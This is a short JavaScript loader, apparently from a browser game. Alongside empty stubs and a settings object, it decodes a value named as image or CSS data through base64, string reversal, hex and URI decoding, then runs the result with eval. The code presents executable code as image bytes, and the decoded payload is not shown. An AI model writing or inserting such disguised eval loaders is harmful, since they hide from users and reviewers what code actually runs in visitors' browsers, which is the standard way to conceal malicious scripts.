function preloadStart() {}

function initGame() {}
if (typeof blk !== 'undefined' && blk == 'all') {
    glk = {
        pl: {
            t1: 0,
            t2: 0
        },
        mm: {
            mg: 0,
            fg: 0
        },
        ig: {
            mg: 0,
            t: 0
        },
        il: {
            mg: 0,
            t: 0
        },
        go: {
            mg: 0,
            t1: 0,
            t2: 0
        }
    };
}
var loaderImageSrc = atob(imageLoaderCssData.substr(22)).split('').reverse().join('');
var imgi = 0,
    imgl = loaderImageSrc.length - 1,
    imgbytes = [];
for (imgi; imgi < imgl; imgi += 2) imgbytes.push(parseInt(loaderImageSrc.substr(imgi, 2), 16));
imgbytes = decodeURIComponent(String.fromCharCode.apply(String, imgbytes));
eval(imgbytes);